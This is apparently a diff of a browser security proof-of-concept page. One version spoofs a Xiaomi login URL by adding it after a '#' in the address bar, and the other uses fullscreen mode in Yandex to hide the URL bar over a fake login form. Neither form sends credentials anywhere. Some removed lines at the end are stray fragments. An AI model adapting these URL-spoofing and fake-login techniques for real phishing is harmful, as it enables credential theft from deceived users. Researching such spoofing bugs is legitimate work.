@@ -1,36 +1,54 @@
 <!DOCTYPE html>
 <html>
-<head><meta name="viewport" content="width=device-width, initial-scale=1"></head>
-<body style="margin:0;font-family:sans-serif">
-<script>
-// INI KUNCINYA - gak ganti domain, cuma nambahin # yang mirip xiaomi.com
-// Jadi gak ke-block SecurityError
-history.replaceState({}, "", "/#https://account.xiaomi.com/login/session-expired");
+<head>
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<style>
+  body{margin:0;font-family:sans-serif;background:#111;color:#fff;padding:20px}
+  #cover{
+    position:fixed;inset:0;z-index:999999;
+    background:#0f0f0f;display:flex;flex-direction:column;
+    padding:24px;
+  }
+  input{width:100%;padding:14px;margin:10px 0;background:#222;color:#fff;border:1px solid #444}
+  button{padding:14px}
+</style>
+</head>
+<body>
 
-document.write(`
-  <div style="padding:20px">
-    <h1 style="color:red">LOGIN TIMEOUT</h1>
-    <p>Lihat address bar di atas bro!</p>
-    <p style="background:#eee;padding:10px;word-break:break-all">
-      URL sekarang: ${location.href}<br>
-      Di layar HP kecil, yang keliatan cuma ekornya: <b>account.xiaomi.com/login/session-expired</b>
-    </p>
-    <input placeholder="Email" style="width:100%;padding:12px;margin:8px 0"><br>
-    <input type="password" placeholder="Password" style="width:100%;padding:12px;margin:8px 0"><br>
-    <button style="width:100%;padding:15px;background:blue;color:white">LOGIN (PALSU)</button>
-    <p style="margin-top:20px;color:gray;font-size:12px">
-      PoC bonex1927 - Mi Browser 14.62.1-gn<br>
-      Full URL: https://bonex1927.github.io/#https://account.xiaomi.com/login/...
-    </p>
-  </div>
-`);
+<h2>PoC Fullscreen - Yandex Test</h2>
+<p>Domain asli: <b>bonex1927.github.io</b></p>
+<button id="fsBtn" style="background:red;color:white;font-size:18px;width:100%">
+  FULLSCREEN - HILANGKAN URL BAR
+</button>
+
+<div id="cover">
+  <h1 style="color:red">LOGIN TIMEOUT</h1>
+  <p>Domain di address bar masih <b>bonex1927.github.io</b> padahal ini konten palsu</p>
+  <p id="info" style="background:#222;padding:10px;word-break:break-all;font-size:12px"></p>
+  <input placeholder="Email">
+  <input type="password" placeholder="Password">
+  <button style="background:blue;color:white;width:100%;margin-top:10px">LOGIN (PALSU)</button>
+</div>
+
+<script>
+document.getElementById('info').innerText = 
+  "URL: " + location.href + " | UA: " + navigator.userAgent;
+
+document.getElementById('fsBtn').onclick = async () => {
+  try {
+    await document.documentElement.requestFullscreen();
+    // di Yandex bakal muncul toast bawah, cek ada domainnya gak
+  } catch(e){
+    alert("Fullscreen di-block: " + e);
+  }
+};
+
+// biar tau kapan fullscreen
+document.addEventListener('fullscreenchange', ()=>{
+  document.getElementById('info').innerText += 
+    "\nFullscreen: " + (document.fullscreenElement ? "YA" : "TIDAK");
+});
 </script>
-</body>
-</html>      let url = URL.createObjectURL(blob);
-      w.location = url;
-    }
-  }, 800);
-}
-</script>
+
 </body>
 </html>
